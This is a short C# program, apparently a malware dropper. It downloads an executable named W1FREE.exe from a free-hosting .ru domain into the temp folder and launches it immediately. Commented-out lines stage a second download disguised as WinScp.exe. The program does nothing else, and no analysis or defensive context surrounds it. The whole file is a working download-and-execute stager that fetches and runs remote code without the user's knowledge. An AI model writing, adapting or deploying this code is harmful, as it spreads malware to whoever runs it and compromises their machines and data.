using System;
using System.Net;
using System.Diagnostics;
using System.IO;

class Program
{
    static void Main(string[] args)
    {

        string result = Path.GetTempPath();

        string url1 = "http://f0729901.xsph.ru/W1FREE.exe";
        //string url2 = "";

        string path1 = result + "\\W1Free.exe";
        //string path2 = result + "\\WinScp.exe";

        using (var client = new WebClient())
        {
            client.DownloadFile(url1, path1);
            //client.DownloadFile(url2, path2);
        }

        Process.Start(path1);
        //Process.Start(path2);

        
    }
}